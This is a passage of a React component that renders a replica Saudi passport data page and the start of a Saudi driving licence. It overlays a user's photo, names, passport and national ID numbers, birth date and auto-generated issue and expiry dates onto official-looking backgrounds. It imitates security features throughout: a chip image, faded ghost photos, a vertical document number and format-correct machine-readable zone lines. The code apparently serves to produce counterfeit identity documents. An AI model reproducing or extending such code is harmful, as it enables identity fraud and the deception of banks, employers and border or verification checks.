                  <span className="absolute top-[27%] left-1/2 transform -translate-x-1/2 text-black font-bold" style={{fontSize: isMobile ? '1.5%' : '9px'}}>SAU</span>
                  <span className="absolute top-[8%] right-[14%] text-[#0D5C3D]" style={{fontFamily: 'DecoType Thuluth II, serif', fontSize: isMobile ? '2.8%' : '17px'}}>المملكة العربية السعودية</span>
                  <div className="absolute top-[6%] left-[14%] text-[#0D5C3D] text-left" style={{fontFamily: 'Arial, sans-serif', fontSize: isMobile ? '1.6%' : '10px'}}>
                    <div>KINGDOM OF</div>
                    <div>SAUDI ARABIA</div>
                    <div className="text-black font-bold mt-0" style={{fontSize: '80%'}}>SAUDI PASSPORT</div>
                    <div className="flex justify-center mt-0.5">
                      <img src="/images/saudi-flag.jpg" alt="Saudi Flag" style={{width: isMobile ? '18px' : '32px', height: isMobile ? '10px' : '20px'}} className="rounded-sm" />
                    </div>
                  </div>
                  <img src="/images/chip.png" alt="Chip" className="absolute top-[6%] left-[32%]" style={{width: '6%'}} />
                  {/* Personal Photo */}
                  {(photoNoBg || photoPreview) && (
                    <div className="absolute top-[32%] left-[12%] w-[16%] h-[38%] overflow-hidden">
                      <img 
                        src={photoNoBg || photoPreview} 
                        alt="الصورة الشخصية" 
                        className="w-full h-full object-cover"
                        crossOrigin="anonymous"
                        style={{
                          imageRendering: '-webkit-optimize-contrast',
                          WebkitBackfaceVisibility: 'hidden',
                          backfaceVisibility: 'hidden',
                          transform: 'translateZ(0)',
                          filter: 'none',
                          WebkitFilter: 'none'
                        }}
                      />
                    </div>
                  )}
                  <span className="absolute top-[21%] left-[32%] text-[#0D5C3D] font-semibold" style={{fontSize: isMobile ? '1.5%' : '9px'}}>Type</span>
                  <span className="absolute top-[24%] left-[33%] text-black font-bold" style={{fontSize: isMobile ? '1.5%' : '9px'}}>P</span>
                  <span className="absolute top-[14%] right-[20%] text-black font-bold" style={{fontFamily: 'Arial, sans-serif', fontSize: isMobile ? '2%' : '12px'}}>جواز سفر</span>
                  <span className="absolute top-[20%] right-[18%] text-[#0D5C3D]" style={{fontFamily: 'Arial, sans-serif', fontSize: isMobile ? '1.5%' : '9px'}}>رقم الجواز/Passport No</span>
                  <span className="absolute top-[24%] right-[20%] text-black font-bold" style={{fontFamily: 'Arial, sans-serif', fontSize: isMobile ? '1.6%' : '10px'}}>{passportNumber}</span>
                  <span className="absolute top-[29%] right-[14%] text-[#0D5C3D] font-bold" style={{fontFamily: 'Arial, sans-serif', fontSize: isMobile ? '1.6%' : '10px'}}>الاسم/ <span className="text-black">{arabicFirstName}{arabicFirstName && arabicSecondName ? (gender === 'ذكر' ? ' بن ' : ' بنت ') : ''}{arabicSecondName}{arabicSecondName && arabicThirdName ? ' بن ' : ''}{arabicThirdName}{arabicThirdName && arabicFourthName ? ' ' : ''}{arabicFourthName}</span></span>
                  <span className="absolute left-[30%] text-[#0D5C3D] font-bold" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr', fontSize: isMobile ? '1.6%' : '10px', top: isMobile ? '34%' : '33%'}}>Name/ <span className="text-black">{englishFourthName ? englishFourthName.toUpperCase() + ', ' : ''}{englishFirstName ? englishFirstName.toUpperCase() + ' ' : ''}{englishSecondName ? englishSecondName.toUpperCase() + ' ' : ''}{englishThirdName ? englishThirdName.charAt(0).toUpperCase() : ''}</span></span>
                  <span className="absolute top-[38%] left-[30%] text-[#0D5C3D]" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr', fontSize: isMobile ? '1.2%' : '7px'}}>Nationality/الجنسية</span>
                  <span className="absolute top-[42%] left-[30%] text-black font-bold" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr', fontSize: isMobile ? '0.7%' : '8px', letterSpacing: isMobile ? '-0.1em' : 'normal'}}>SAUDI ARABIA السعودية</span>
                  <span className="absolute top-[46%] left-[30%] text-[#0D5C3D]" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr', fontSize: isMobile ? '1.5%' : '9px'}}>Date of Birth</span>
                <span className="absolute top-[46%] left-[50%] text-[#0D5C3D]" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr', fontSize: isMobile ? '1.5%' : '9px'}}>تاريخ الميلاد</span>
                  
                  {/* Oval photo on the right side */}
                  {(photoNoBg || photoPreview) && (
                    <div className="absolute right-[26%] overflow-hidden" style={{borderRadius: '50%', border: '1px solid #808080', display: 'flex', alignItems: 'center', justifyContent: 'center', width: isMobile ? '10%' : '11%', height: isMobile ? '24%' : '26%', top: isMobile ? '40%' : '36%'}}>
                      <img 
                        src={photoNoBg || photoPreview} 
                        alt="" 
                        className="object-cover" style={{width: '80%', height: '80%', objectPosition: 'center center', opacity: 0.5}}
                      />
                    </div>
                  )}
                  {/* Vertical passport number next to oval photo */}
                  <div className="absolute right-[24%] flex flex-col justify-start items-center" style={{top: isMobile ? '40%' : '36%', height: isMobile ? '28%' : '32%'}}>
                    {passportNumber.split('').map((char, index) => (
                      <span key={index} className="text-black font-bold" style={{lineHeight: isMobile ? '0.8' : '1', fontSize: isMobile ? '1.3%' : '9px'}}>
                        {char}
                      </span>
                    ))}
                  </div>
                  {/* Second photo - no border, 30% opacity */}
                  {(photoNoBg || photoPreview) && (
                    <div className="absolute top-[42%] right-[15%] w-[6%] h-[16%] overflow-hidden" style={{display: 'flex', alignItems: 'center', justifyContent: 'center'}}>
                      <img 
                        src={photoNoBg || photoPreview} 
                        alt="" 
                        className="object-cover" style={{width: '100%', height: '100%', objectPosition: 'center center', opacity: 0.2}}
                      />
                    </div>
                  )}
                  {/* Issuing Authority */}
                  <span className="absolute top-[64%] right-[14%] text-[#0D5C3D]" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr', fontSize: isMobile ? '1.5%' : '9px'}}>Issuing Authority/ مكان الإصدار</span>
                  {/* District Display - Arabic and English */}
                  <span className="absolute top-[68%] right-[14%] text-black font-bold" style={{fontFamily: 'Arial, sans-serif', direction: 'rtl', fontSize: isMobile ? '1.5%' : '9px'}}>{district}</span>
                  <span className="absolute top-[68%] right-[25%] text-black font-bold" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr', fontSize: isMobile ? '1.5%' : '9px'}}>
                    {district === 'الرياض' ? 'Riyadh' : district === 'الدرعية' ? 'Ad Diriyah' : district === 'الخرج' ? 'Al Kharj' : district === 'الدوادمي' ? 'Ad Dawadmi' : district === 'المجمعة' ? 'Al Majmaah' : district === 'القويعية' ? 'Al Quwaiyah' : district === 'وادي الدواسر' ? 'Wadi ad Dawasir' : district === 'الأفلاج' ? 'Al Aflaj' : district === 'الزلفي' ? 'Az Zulfi' : district === 'شقراء' ? 'Shaqra' : district === 'حوطة بني تميم' ? 'Howtat Bani Tamim' : district === 'عفيف' ? 'Afif' : district === 'السليل' ? 'As Sulayyil' : district === 'ضرما' ? 'Durma' : district === 'المزاحمية' ? 'Al Muzahmiyya' : district === 'رماح' ? 'Rumah' : district === 'ثادق' ? 'Thadiq' : district === 'حريملاء' ? 'Huraymila' : district === 'الحريق' ? 'Al Hariq' : district === 'الغاط' ? 'Al Ghat' : district === 'مرات' ? 'Marat' : district === 'مكة المكرمة' ? 'Makkah' : district === 'جدة' ? 'Jeddah' : district === 'الطائف' ? 'Taif' : district === 'المدينة المنورة' ? 'Madinah' : district === 'ينبع' ? 'Yanbu' : district === 'الدمام' ? 'Dammam' : district === 'الأحساء' ? 'Al Ahsa' : district === 'حفر الباطن' ? 'Hafar Al Batin' : district === 'الجبيل' ? 'Jubail' : district === 'القطيف' ? 'Qatif' : district === 'الخبر' ? 'Khobar' : district === 'الظهران' ? 'Dhahran' : district === 'أبها' ? 'Abha' : district === 'خميس مشيط' ? 'Khamis Mushait' : district === 'تبوك' ? 'Tabuk' : district === 'حائل' ? 'Hail' : district === 'عرعر' ? 'Arar' : district === 'جازان' ? 'Jazan' : district === 'نجران' ? 'Najran' : district === 'الباحة' ? 'Al Bahah' : district === 'سكاكا' ? 'Sakaka' : district === 'بريدة' ? 'Buraydah' : district === 'القنفذة' ? 'Al Qunfudhah' : district === 'الليث' ? 'Al Lith' : district === 'رابغ' ? 'Rabigh' : district === 'خليص' ? 'Khulais' : district === 'الجموم' ? 'Al Jumum' : district === 'الكامل' ? 'Al Kamil' : district === 'الخرمة' ? 'Al Khurma' : district === 'رنية' ? 'Ranyah' : district === 'تربة' ? 'Turbah' : district === 'الموية' ? 'Al Muwayh' : district === 'ميسان' ? 'Maysan' : district === 'أضم' ? 'Adham' : district === 'العرضيات' ? 'Al Ardiyat' : district === 'بحرة' ? 'Bahrah' : district === 'العلا' ? 'Al Ula' : district === 'مهد الذهب' ? 'Mahd adh Dhahab' : district === 'الحناكية' ? 'Al Hanakiyah' : district === 'بدر' ? 'Badr' : district === 'خيبر' ? 'Khaybar' : district === 'وادي الفرع' ? 'Wadi Al Fara' : district === 'عنيزة' ? 'Unayzah' : district === 'الرس' ? 'Ar Rass' : district === 'المذنب' ? 'Al Mithnab' : district === 'البكيرية' ? 'Al Bukayriyah' : district === 'البدائع' ? 'Al Badai' : district === 'الأسياح' ? 'Al Asyah' : district === 'النبهانية' ? 'An Nabhaniyah' : district === 'الشماسية' ? 'Ash Shimasiyah' : district === 'عيون الجواء' ? 'Uyun Al Jawa' : district === 'رياض الخبراء' ? 'Riyadh Al Khabra' : district === 'عقلة الصقور' ? 'Uqlat As Suqur' : district === 'ضريه' ? 'Dariyah' : district === 'رأس تنورة' ? 'Ras Tanura' : district === 'بقيق' ? 'Buqayq' : district === 'النعيرية' ? 'An Nuayriyah' : district === 'قرية العليا' ? 'Qaryat Al Ulya' : district === 'العديد' ? 'Al Adid' : district === 'بيشة' ? 'Bishah' : district === 'النماص' ? 'An Namas' : district === 'محايل عسير' ? 'Muhayil Asir' : district === 'ظهران الجنوب' ? 'Dhahran Al Janub' : district === 'تثليث' ? 'Tathlith' : district === 'سراة عبيدة' ? 'Sarat Abidah' : district === 'رجال ألمع' ? 'Rijal Almaa' : district === 'أحد رفيدة' ? 'Ahad Rafidah' : district === 'بلقرن' ? 'Balqarn' : district === 'المجاردة' ? 'Al Majardah' : district === 'البرك' ? 'Al Birk' : district === 'تنومة' ? 'Tanumah' : district === 'الوجه' ? 'Al Wajh' : district === 'ضباء' ? 'Duba' : district === 'تيماء' ? 'Tayma' : district === 'أملج' ? 'Umluj' : district === 'حقل' ? 'Haql' : district === 'البدع' ? 'Al Bada' : district === 'بقعاء' ? 'Baqaa' : district === 'الغزالة' ? 'Al Ghazalah' : district === 'الشنان' ? 'Ash Shinan' : district === 'الحائط' ? 'Al Hait' : district === 'السليمي' ? 'As Sulaymi' : district === 'موقق' ? 'Mawqaq' : district === 'الشملي' ? 'Ash Shamli' : district === 'رفحاء' ? 'Rafha' : district === 'طريف' ? 'Turaif' : district === 'العويقيلة' ? 'Al Uwayqilah' : district === 'صبيا' ? 'Sabya' : district === 'أبو عريش' ? 'Abu Arish' : district === 'صامطة' ? 'Samtah' : district === 'بيش' ? 'Baysh' : district === 'الدرب' ? 'Ad Darb' : district === 'الريث' ? 'Ar Rayth' : district === 'ضمد' ? 'Damad' : district === 'الحرث' ? 'Al Harth' : district === 'فرسان' ? 'Farasan' : district === 'الدائر' ? 'Ad Dair' : district === 'العيدابي' ? 'Al Idabi' : district === 'أحد المسارحة' ? 'Ahad Al Masarihah' : district === 'العارضة' ? 'Al Aridah' : district === 'فيفاء' ? 'Fayfa' : district === 'الطوال' ? 'At Tuwal' : district === 'هروب' ? 'Harub' : district === 'شرورة' ? 'Sharurah' : district === 'حبونا' ? 'Hubuna' : district === 'بدر الجنوب' ? 'Badr Al Janub' : district === 'يدمة' ? 'Yadamah' : district === 'ثار' ? 'Thar' : district === 'خباش' ? 'Khabash' : district === 'بلجرشي' ? 'Baljurashi' : district === 'المندق' ? 'Al Mandaq' : district === 'المخواة' ? 'Al Makhwah' : district === 'قلوة' ? 'Qilwah' : district === 'العقيق' ? 'Al Aqiq' : district === 'غامد الزناد' ? 'Ghamid Az Zinad' : district === 'الحجرة' ? 'Al Hajrah' : district === 'بني حسن' ? 'Bani Hasan' : district === 'دومة الجندل' ? 'Dumat Al Jandal' : district === 'القريات' ? 'Al Qurayyat' : district === 'طبرجل' ? 'Tabarjal' : district === 'صوير' ? 'Suwayr' : ''}
                  </span>
                  <span className="absolute top-[38%] text-[#0D5C3D]" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr', fontSize: isMobile ? '1.5%' : '9px', left: isMobile ? '51%' : '50%'}}>Sex/الجنس</span>
                  <span className="absolute top-[42%] text-black font-bold" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr', fontSize: isMobile ? '1.5%' : '9px', left: isMobile ? '53%' : '50%'}}>{gender === 'ذكر' ? 'M' : gender === 'أنثى' ? 'F' : ''}</span>
                  <span className="absolute top-[42%] text-black font-bold" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr', fontSize: isMobile ? '1.5%' : '9px', left: isMobile ? '58%' : '54%'}}>{gender}</span>
                  <span className="absolute top-[50%] left-[30%] text-black font-bold" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr', fontSize: isMobile ? '1.5%' : '9px'}}>
                    {calendarType === 'gregorian' && dateOfBirth 
                      ? (() => {
                            const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
                            const d = dateOfBirth.getDate();
                            const m = dateOfBirth.getMonth();
                            const y = dateOfBirth.getFullYear();
                            return `${String(d).padStart(2, '0')} ${months[m]} ${y}`;
                          })() 
                      : calendarType === 'hijri' && hijriDate.day && hijriDate.month && hijriDate.year 
                        ? (() => {
                            const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
                            const hY = parseInt(hijriDate.year);
                            const hM = parseInt(hijriDate.month);
                            const hD = parseInt(hijriDate.day);
                            const jd = Math.floor((11 * hY + 3) / 30) + 354 * hY + 30 * hM - Math.floor((hM - 1) / 2) + hD + 1948440 - 385;
                            const l = jd + 68569;
                            const n = Math.floor(4 * l / 146097);
                            const l2 = l - Math.floor((146097 * n + 3) / 4);
                            const i = Math.floor(4000 * (l2 + 1) / 1461001);
                            const l3 = l2 - Math.floor(1461 * i / 4) + 31;
                            const j = Math.floor(80 * l3 / 2447);
                            const gD = l3 - Math.floor(2447 * j / 80);
                            const l4 = Math.floor(j / 11);
                            const gM = j + 2 - 12 * l4;
                            const gY = 100 * (n - 49) + i + l4;
                            return `${String(gD).padStart(2, '0')} ${months[gM - 1]} ${gY}`;
                          })()
                        : ''}
                  </span>
                  {/* Hijri Date of Birth */}
                  <span className="absolute top-[50%] text-black font-bold" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr', textAlign: 'right', fontSize: isMobile ? '1.5%' : '9px', left: isMobile ? '45%' : '50%'}}>
                    {calendarType === 'gregorian' && dateOfBirth 
                      ? (() => {
                            const gY = dateOfBirth.getFullYear();
                            const gM = dateOfBirth.getMonth() + 1;
                            const gD = dateOfBirth.getDate();
                            const jd = Math.floor((1461 * (gY + 4800 + Math.floor((gM - 14) / 12))) / 4) + Math.floor((367 * (gM - 2 - 12 * Math.floor((gM - 14) / 12))) / 12) - Math.floor((3 * Math.floor((gY + 4900 + Math.floor((gM - 14) / 12)) / 100)) / 4) + gD - 32075;
                            const l = jd - 1948440 + 10632;
                            const n = Math.floor((l - 1) / 10631);
                            const l2 = l - 10631 * n + 354;
                            const j = Math.floor((10985 - l2) / 5316) * Math.floor((50 * l2) / 17719) + Math.floor(l2 / 5670) * Math.floor((43 * l2) / 15238);
                            const l3 = l2 - Math.floor((30 - j) / 15) * Math.floor((17719 * j) / 50) - Math.floor(j / 16) * Math.floor((15238 * j) / 43) + 29;
                            const hM = Math.floor((24 * l3) / 709);
                            const hD = l3 - Math.floor((709 * hM) / 24);
                            const hY = 30 * n + j - 30;
                            const toArabicNum = (num: number) => num.toString().replace(/[0-9]/g, d => '٠١٢٣٤٥٦٧٨٩'[parseInt(d)]);
                            return `${toArabicNum(hY)}/${toArabicNum(String(hM).padStart(2, '0'))}/${toArabicNum(String(hD).padStart(2, '0'))}`;
                          })() 
                      : calendarType === 'hijri' && hijriDate.day && hijriDate.month && hijriDate.year 
                        ? (() => {
                            const toArabicNum = (num: number) => num.toString().replace(/[0-9]/g, d => '٠١٢٣٤٥٦٧٨٩'[parseInt(d)]);
                            return `${toArabicNum(parseInt(hijriDate.year))}/${toArabicNum(String(parseInt(hijriDate.month)).padStart(2, '0'))}/${toArabicNum(String(parseInt(hijriDate.day)).padStart(2, '0'))}`;
                          })()
                        : ''}
                  </span>
                  <span className="absolute top-[54%] left-[30%] text-[#0D5C3D]" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr', fontSize: isMobile ? '1.5%' : '9px'}}>Date of Issue</span>
                  <span className="absolute top-[54%] text-[#0D5C3D]" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr', fontSize: isMobile ? '1.5%' : '9px', left: isMobile ? '48%' : '50%'}}>تاريخ الإصدار</span>
                  <span className="absolute top-[58%] text-black font-bold" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr', fontSize: isMobile ? '1.5%' : '9px', left: isMobile ? '45%' : '50%'}}>
                    {(() => {
                      const today = new Date();
                      const gY = today.getFullYear();
                      const gM = today.getMonth() + 1;
                      const gD = today.getDate();
                      const jd = Math.floor((1461 * (gY + 4800 + Math.floor((gM - 14) / 12))) / 4) + Math.floor((367 * (gM - 2 - 12 * Math.floor((gM - 14) / 12))) / 12) - Math.floor((3 * Math.floor((gY + 4900 + Math.floor((gM - 14) / 12)) / 100)) / 4) + gD - 32075;
                      const l = jd - 1948440 + 10632;
                      const n = Math.floor((l - 1) / 10631);
                      const l2 = l - 10631 * n + 354;
                      const j = Math.floor((10985 - l2) / 5316) * Math.floor((50 * l2) / 17719) + Math.floor(l2 / 5670) * Math.floor((43 * l2) / 15238);
                      const l3 = l2 - Math.floor((30 - j) / 15) * Math.floor((17719 * j) / 50) - Math.floor(j / 16) * Math.floor((15238 * j) / 43) + 29;
                      const hM = Math.floor((24 * l3) / 709);
                      const hD = l3 - Math.floor((709 * hM) / 24);
                      const hY = 30 * n + j - 30;
                      const toArabicNum = (num: number) => num.toString().replace(/[0-9]/g, d => '٠١٢٣٤٥٦٧٨٩'[parseInt(d)]);
                      return `${toArabicNum(hY)}/${toArabicNum(String(hM).padStart(2, '0'))}/${toArabicNum(String(hD).padStart(2, '0'))}`;
                    })()}
                  </span>
                  <span className="absolute top-[58%] left-[30%] text-black font-bold" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr', fontSize: isMobile ? '1.5%' : '9px'}}>
                    {(() => {
                      const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
                      const today = new Date();
                      const d = today.getDate();
                      const m = today.getMonth();
                      const y = today.getFullYear();
                      return `${String(d).padStart(2, '0')} ${months[m]} ${y}`;
                    })()}
                  </span>
                  <span className="absolute top-[62%] left-[30%] text-[#0D5C3D]" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr', fontSize: isMobile ? '1.5%' : '9px'}}>Date of Expiry</span>
                  <span className="absolute top-[62%] text-[#0D5C3D]" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr', fontSize: isMobile ? '1.5%' : '9px', left: isMobile ? '48%' : '50%'}}>تاريخ الانتهاء</span>
                  <span className="absolute top-[66%] text-black font-bold" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr', fontSize: isMobile ? '1.5%' : '9px', left: isMobile ? '45%' : '50%'}}>
                    {(() => {
                      const today = new Date();
                      const gY = today.getFullYear() + 5;
                      const gM = today.getMonth() + 1;
                      const gD = today.getDate();
                      const jd = Math.floor((1461 * (gY + 4800 + Math.floor((gM - 14) / 12))) / 4) + Math.floor((367 * (gM - 2 - 12 * Math.floor((gM - 14) / 12))) / 12) - Math.floor((3 * Math.floor((gY + 4900 + Math.floor((gM - 14) / 12)) / 100)) / 4) + gD - 32075;
                      const l = jd - 1948440 + 10632;
                      const n = Math.floor((l - 1) / 10631);
                      const l2 = l - 10631 * n + 354;
                      const j = Math.floor((10985 - l2) / 5316) * Math.floor((50 * l2) / 17719) + Math.floor(l2 / 5670) * Math.floor((43 * l2) / 15238);
                      const l3 = l2 - Math.floor((30 - j) / 15) * Math.floor((17719 * j) / 50) - Math.floor(j / 16) * Math.floor((15238 * j) / 43) + 29;
                      const hM = Math.floor((24 * l3) / 709);
                      const hD = l3 - Math.floor((709 * hM) / 24);
                      const hY = 30 * n + j - 30;
                      const toArabicNum = (num: number) => num.toString().replace(/[0-9]/g, d => '٠١٢٣٤٥٦٧٨٩'[parseInt(d)]);
                      return `${toArabicNum(hY)}/${toArabicNum(String(hM).padStart(2, '0'))}/${toArabicNum(String(hD).padStart(2, '0'))}`;
                    })()}
                  </span>
                  <span className="absolute top-[66%] left-[30%] text-black font-bold" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr', fontSize: isMobile ? '1.5%' : '9px'}}>
                    {(() => {
                      const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
                      const today = new Date();
                      const d = today.getDate();
                      const m = today.getMonth();
                      const y = today.getFullYear() + 5;
                      return `${String(d).padStart(2, '0')} ${months[m]} ${y}`;
                    })()}
                  </span>
                  {/* MRZ Lines */}
                  <div className="absolute top-[80%] text-black font-bold" style={{fontFamily: 'OCR-B, Courier New, monospace', letterSpacing: isMobile ? '0.02em' : '0.12em', direction: 'ltr', fontSize: isMobile ? '1.4%' : '13px', left: isMobile ? '5%' : '16%', right: isMobile ? '5%' : '4%', textAlign: isMobile ? 'center' : 'left'}}>
                    {(() => {
                      const MRZ_LENGTH = 44;
                      const surname = englishFourthName ? englishFourthName.toUpperCase() : '';
                      const firstName = englishFirstName ? englishFirstName.toUpperCase() : '';
                      const secondName = englishSecondName ? englishSecondName.toUpperCase() : '';
                      const thirdInitial = englishThirdName ? englishThirdName.charAt(0).toUpperCase() : '';
                      const namesPart = `P<SAU${surname}<<${firstName}<${secondName}<${thirdInitial}`;
                      const fillersNeeded = MRZ_LENGTH - namesPart.length;
                      const fillers = fillersNeeded > 0 ? '<'.repeat(fillersNeeded) : '';
                      return namesPart + fillers;
                    })()}
                  </div>
                  <div className="absolute top-[86%] text-black font-bold" style={{fontFamily: 'OCR-B, Courier New, monospace', letterSpacing: isMobile ? '0.02em' : '0.12em', direction: 'ltr', fontSize: isMobile ? '1.4%' : '13px', left: isMobile ? '5%' : '16%', right: isMobile ? '5%' : '4%', textAlign: isMobile ? 'center' : 'left'}}>
                    {(() => {
                      const MRZ_LENGTH = 44;
                      let birthDateStr = '';
                      let birthDate: Date | null = null;
                      if (calendarType === 'gregorian' && dateOfBirth) {
                        birthDate = dateOfBirth;
                      } else if (calendarType === 'hijri' && hijriDate.day && hijriDate.month && hijriDate.year) {
                        const hY = parseInt(hijriDate.year);
                        const hM = parseInt(hijriDate.month);
                        const hD = parseInt(hijriDate.day);
                        const jd = Math.floor((11 * hY + 3) / 30) + 354 * hY + 30 * hM - Math.floor((hM - 1) / 2) + hD + 1948440 - 385;
                        const l = jd + 68569;
                        const n = Math.floor(4 * l / 146097);
                        const l2 = l - Math.floor((146097 * n + 3) / 4);
                        const i = Math.floor(4000 * (l2 + 1) / 1461001);
                        const l3 = l2 - Math.floor(1461 * i / 4) + 31;
                        const j = Math.floor(80 * l3 / 2447);
                        const gD = l3 - Math.floor(2447 * j / 80);
                        const l4 = Math.floor(j / 11);
                        const gM = j + 2 - 12 * l4;
                        const gY = 100 * (n - 49) + i + l4;
                        birthDate = new Date(gY, gM - 1, gD);
                      }
                      if (birthDate) {
                        const yy = String(birthDate.getFullYear()).slice(-2);
                        const mm = String(birthDate.getMonth() + 1).padStart(2, '0');
                        const dd = String(birthDate.getDate()).padStart(2, '0');
                        birthDateStr = `${yy}${mm}${dd}`;
                      }
                      const genderCode = gender === 'ذكر' ? 'M' : 'F';
                      const today = new Date();
                      const expiry = new Date(today.getFullYear() + 5, today.getMonth(), today.getDate());
                      const expiryStr = String(expiry.getFullYear()).slice(-2) + String(expiry.getMonth() + 1).padStart(2, '0') + String(expiry.getDate()).padStart(2, '0');
                      const lastDigit = gender === 'ذكر' ? '2' : '2';
                      const dataPart = `${passportNumber}<<0SAU${birthDateStr}${genderCode}${expiryStr}`;
                      const fillersNeeded = MRZ_LENGTH - dataPart.length - 1;
                      const fillers = fillersNeeded > 0 ? '<'.repeat(fillersNeeded) : '';
                      return dataPart + fillers + lastDigit;
                    })()}
                  </div>
                </div>
          </div>
        </div>


        {/* Part 4: Driving License */}
        <div className={`mb-8 ${showDrivingLicense ? '' : 'hidden'}`}>
          {/* Title hidden as per requirements */}
          <div className="flex justify-center">
            <div className="relative" style={{width: '600px', maxWidth: '100%'}}>
              {/* Driving License Background */}
              <img 
                src="/saudi-driving-license.png" 
                alt="رخصة القيادة" 
                className="w-full h-auto rounded-lg shadow-lg"
              />
              {/* Client Photo */}
              {(photoNoBg || photoPreview) && (
                <div className="absolute" style={{
                  top: '35%',
                  left: '2%',
                  width: '24%',
                  height: '55%',
                  overflow: 'hidden'
                }}>
                  <img 
                    src={photoNoBg || photoPreview} 
                    alt="صورة العميل" 
                    className="w-full h-full object-cover"
                    crossOrigin="anonymous"
                  />
                </div>
              )}
              {/* Arabic Name */}
              <span 
                className="absolute text-black font-bold"
                style={{
                  top: isMobile ? '36%' : '35%',
                  right: '5%',
                  fontSize: isMobile ? '3vw' : '16px',
                  fontFamily: 'Arial, sans-serif',
                  direction: 'rtl',
                  textAlign: 'right',
                }}
              >
                {arabicFirstName} {arabicSecondName} {arabicThirdName} {arabicFourthName}
              </span>
              {/* English Name */}
              <span 
                className="absolute text-black font-bold"
                style={{
                  top: isMobile ? '44%' : '43%',
                  right: '5%',
                  fontSize: isMobile ? '2.5vw' : '14px',
                  fontFamily: 'Arial, sans-serif',
                  direction: 'ltr',
                  textTransform: 'uppercase',
                  textAlign: 'right',
                }}
              >
                {englishFirstName} {englishSecondName} {englishThirdName} {englishFourthName}
              </span>
              
              {/* License Info Grid */}
              <div className="absolute" style={{
                top: '52%',
                left: '35%',
                right: '5%',
                fontSize: isMobile ? '2.5vw' : '13px',
                fontFamily: 'Arial, sans-serif',
              }}>
                {/* Row 1: No. / الرقم */}
                <div style={{display: 'flex', justifyContent: 'space-between', marginBottom: '2px'}}>
                  <span style={{direction: 'rtl'}}>الرقم {nationalId.replace(/[0-9]/g, (d: string) => '٠١٢٣٤٥٦٧٨٩'[parseInt(d)])}</span>
                  <span style={{direction: 'ltr'}}>No. {nationalId}</span>
                </div>
                {/* Row 2: DOB / تاريخ الميلاد */}
                <div style={{display: 'flex', justifyContent: 'space-between', marginBottom: '2px'}}>
                  <span style={{direction: 'rtl'}}>تاريخ الميلاد {(() => {
                    if (dateOfBirth) {
                      const gY = dateOfBirth.getFullYear();
                      const gM = dateOfBirth.getMonth() + 1;
                      const gD = dateOfBirth.getDate();
                      const jd = Math.floor((1461 * (gY + 4800 + Math.floor((gM - 14) / 12))) / 4) + Math.floor((367 * (gM - 2 - 12 * Math.floor((gM - 14) / 12))) / 12) - Math.floor((3 * Math.floor((gY + 4900 + Math.floor((gM - 14) / 12)) / 100)) / 4) + gD - 32075;
                      const l = jd - 1948440 + 10632;
                      const n = Math.floor((l - 1) / 10631);
                      const l2 = l - 10631 * n + 354;
                      const j = Math.floor((10985 - l2) / 5316) * Math.floor((50 * l2) / 17719) + Math.floor(l2 / 5670) * Math.floor((43 * l2) / 15238);
                      const l3 = l2 - Math.floor((30 - j) / 15) * Math.floor((17719 * j) / 50) - Math.floor(j / 16) * Math.floor((15238 * j) / 43) + 29;
                      const hM = Math.floor((24 * l3) / 709);
                      const hD = l3 - Math.floor((709 * hM) / 24);
                      const hY = 30 * n + j - 30;
                      return `${hY}/${String(hM).padStart(2, '0')}/${String(hD).padStart(2, '0')}`.replace(/[0-9]/g, (d: string) => '٠١٢٣٤٥٦٧٨٩'[parseInt(d)]);
                    }
                    return '';
                  })()}</span>
                  <span style={{direction: 'ltr'}}>DOB {dateOfBirth ? dateOfBirth.toLocaleDateString('en-GB').replace(/\//g, '/') : ''}</span>
                </div>
                {/* Row 3: Exp / تاريخ الانتهاء */}
                <div style={{display: 'flex', justifyContent: 'space-between', marginBottom: '2px'}}>
                  <span style={{direction: 'rtl'}}>تاريخ الانتهاء {(() => {
                    const today = new Date();
                    const gY = today.getFullYear() + 10;
                    const gM = today.getMonth() + 1;
                    const gD = today.getDate();
                    const jd = Math.floor((1461 * (gY + 4800 + Math.floor((gM - 14) / 12))) / 4) + Math.floor((367 * (gM - 2 - 12 * Math.floor((gM - 14) / 12))) / 12) - Math.floor((3 * Math.floor((gY + 4900 + Math.floor((gM - 14) / 12)) / 100)) / 4) + gD - 32075;
                    const l = jd - 1948440 + 10632;
                    const n = Math.floor((l - 1) / 10631);
                    const l2 = l - 10631 * n + 354;
                    const j = Math.floor((10985 - l2) / 5316) * Math.floor((50 * l2) / 17719) + Math.floor(l2 / 5670) * Math.floor((43 * l2) / 15238);
                    const l3 = l2 - Math.floor((30 - j) / 15) * Math.floor((17719 * j) / 50) - Math.floor(j / 16) * Math.floor((15238 * j) / 43) + 29;
                    const hM = Math.floor((24 * l3) / 709);
                    const hD = l3 - Math.floor((709 * hM) / 24);
                    const hY = 30 * n + j - 30;
